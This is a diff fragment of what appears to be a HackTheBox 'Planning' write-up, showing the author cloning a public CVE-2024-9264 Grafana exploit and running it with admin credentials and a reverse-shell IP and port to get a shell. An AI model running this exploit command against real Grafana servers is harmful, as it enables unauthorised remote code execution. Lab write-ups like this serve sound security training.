@@ -25,7 +25,9 @@ Git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit
 ![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image0013.png)
 
 The script is then executed and a listener is set up.
+
 Note: To run the script, you will have to install the requests module through pip (pip install requests), in a python virtual environment.
+
 python3 poc.py --url http://grafana.planning.htb/ --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.131 --reverse-port 1234
 
 ![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image015.png)
